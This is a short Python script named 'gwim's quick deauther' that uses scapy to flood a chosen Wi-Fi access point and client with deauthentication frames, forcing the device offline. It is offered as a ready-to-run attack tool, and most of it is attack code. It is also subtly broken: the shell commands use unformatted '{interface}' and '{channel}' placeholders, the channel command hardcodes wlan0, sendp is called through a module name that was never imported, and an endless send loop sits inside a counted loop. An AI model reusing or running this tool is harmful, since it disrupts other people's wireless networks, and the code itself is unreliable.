#!/usr/bin/env python3
from scapy import * 
import os, time, argparse


parser = argparse.ArgumentParser(prog="gwim's quick deauther",
                                 usage="python3 wifijammer.py -i wlan0 -b 00:11:22:33:44:55 -c ff:ff:ff:ff:ff:ff -ch 1 -p 1000",
                                 description="a quick deauther",
                                 epilog="made by gwim")

parser.add_argument("-i", "--interface", help="interface to use", required=True)
parser.add_argument("-b", "--bssid", help="bssid of the target", required=True)
parser.add_argument("-c", "--client", help="client to deauth", required=True)
parser.add_argument('-ch', '--channel', help='channel of the target', required=True)
parser.add_argument("-p", "--packets", help="number of packets to send", required=True)
args = parser.parse_args()


interface = str(args.interface)
bssid = str(args.bssid)
client = str(args.client)
packets = int(args.packets)
channel = str(args.channel)

def enable_monitor_mode():
    os.system('sudo ifconfig {interface} down')
    os.system('sudo iwconfig {interface} mode monitor')
    os.system('sudo ifconfig {interface} up')

def deauth_attack():
    os.system('sudo iwconfig wlan0 channel {channel}')

    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    time.sleep(1)
    for i in range(packets):
        scapy.sendp(packet, iface=interface, inter=0.1, loop=1, verbose=0)
        print("Deauth packet sent to {bssid}")

enable_monitor_mode()
deauth_attack()
